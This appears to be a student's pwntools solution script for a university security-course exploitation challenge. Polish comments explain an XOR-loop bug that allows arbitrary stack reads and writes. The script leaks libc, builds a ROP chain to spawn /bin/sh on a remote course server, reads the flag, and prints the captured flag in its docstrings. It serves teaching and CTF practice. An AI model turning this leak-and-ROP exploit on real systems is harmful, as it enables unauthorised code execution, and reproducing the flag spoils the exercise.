#!/usr/bin/env python3
from pwn import *

exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
index_number = b"438709"
doing_local = False


def conn():
    if doing_local:
        r = process([exe.path, index_number])
        gdb_str =  """
            b * decrypt + 306
        """
        gdb.attach(r, gdb_str)
    else:
        r = remote("bsk.bonus.re", 13337)
        r.recvuntil(b"indeksu\n")
        r.sendline(index_number)
        r.recvuntil(b"easy\n")
        r.sendline(b"1")

    return r


def go_through_dialog(r, KEY_LEN, KEY):
    r.recvuntil(b"the data?\n")
    r.sendline(b"0")
    r.recvuntil(b"data: ")
    r.recvuntil(b"the key?\n")
    r.sendline(KEY_LEN)
    r.recvuntil(b"key: ")
    r.sendline(KEY)

    r.recvuntil(b"Here's your decrypted data:\n")
    return r.recvn(int(KEY_LEN.decode()))


def read_stack_many(r, pos, length):
    """
        Czyta ze stosu wartości na pozycjach pos, pos + 1, ..., pos + length - 1,
        względem miejsca, na które wskazuje wskaźnik na DATA.
    """
    KEY_LEN = str(8 * (pos - 1) + 8 * length).encode()
    KEY = b"\x00" * 8 * (pos - 1) + b"\x00" * 8 * length
    result = go_through_dialog(r, KEY_LEN, KEY)
    result = [u64(result[i:i+8]) for i in range((pos - 1) * 8, (pos + length - 1) * 8, 8)]
    return result


def write_stack_many(r, pos, values, curr_values):
    """
        Ustawia na stosie wartości z listy "values"
        na pozycjach pos, pos + 1, ..., pos + len(values) - 1.
        Wartości te są XORowane z wartościami z listy "curr_values".
    """
    length = len(values)    
    KEY_LEN = str(8 * (pos - 1) + 8 * length).encode()
    KEY = b"\x00" * 8 * (pos - 1) + \
        b"".join([p64(value ^ curr_value) 
                for value, curr_value in zip(values, curr_values)])
    
    result = go_through_dialog(r, KEY_LEN, KEY)
    result = [u64(result[i:i+8]) for i in range((pos - 1) * 8, (pos + length - 1) * 8, 8)]
    return result


def main():
    """
        Rozwiązanie zadania hard z BSK, numer indeksu 438709.
        Flaga: bsk{fb99b976f07a8ad5b49a70e8f7f7e939}
        
        Podatnością jest możliwość pisania na dowolne miejsce na stosie,
        ponieważ pętla for, która xoruje dane z kluczem wykonuje się
        dla każdego bajtu z klucza, a nie dla każdego bajtu danych.

        W zadaniu podajemy wielkość danych równą 0, a wielkość klucza
        zależną od miejsca, na którym chcemy zapisać dane.

        Aby ustawić wartość na stosie na dowolną wartość, musimy
        poznać obecną wartość, a następnie wykonując operację XOR, co robi
        funkcja write_stack_many.
    """
    r = conn()
    curr_values = read_stack_many(r, 12, 1)
    libc_start_main_ret_addr = curr_values[0]

    """
        Za pomocą polecenia:
            readelf -s libc.so.6
        oraz strony https://libc.rip/ znalazłem offsety
        szukanych funkcji w bibliotece libc względem adresu
        podstawy biblioteki libc.

        Bazę libc obliczyłem z wartości na stosie,
        która wskazuje na addres wewnątrz funkcji libc_start_main. 

        Gadgety znalazłem programem ROPgadget:
            ROPgadget --binary libc.so.6 --only "pop|ret"
    """
    libc_base = libc_start_main_ret_addr - 0x280d0
    pop_rax_addr = libc_base + 0x0000000000046663
    pop_rdi_addr = libc_base + 0x0000000000028715
    pop_rsi_addr = libc_base + 0x000000000002a671
    pop_rdx_rbx_addr = libc_base + 0x0000000000093359
    str_bin_sh_addr = libc_base + 0x1c041b
    system_addr = libc_base + 0x55230

    new_stack = [
        pop_rax_addr,
        59, # 59 to kod syscallu systemu linux, który odpowiada za wywołanie systemu execve
        pop_rdi_addr, # do rdi wrzucamy adres "/bin/sh"
        str_bin_sh_addr,
        pop_rsi_addr, 
        0, # do rsi wrzucamy 0
        pop_rdx_rbx_addr,
        0, # do rdx wrzucamy 0
        0, # do rbx wrzucamy 0
        system_addr,
    ]

    curr_values = read_stack_many(r, 8, len(new_stack)) # to pozycja, na której jest adres powortu do maina.
    write_stack_many(r, 8, new_stack, curr_values) # nadpisujemy adres powrotu do maina na nasz Gadget.

    if doing_local:
        r.interactive()
    else:
        sleep(0.3)
        r.sendline(b"cat /tmp/flag.txt")
        ans = r.recvuntil(b"}")
        print("flaga:", ans)


if __name__ == "__main__":
    """
        Zadanie: hard
        Numer indeksu: 438709
        Flaga: bsk{fb99b976f07a8ad5b49a70e8f7f7e939}
    """
    main()
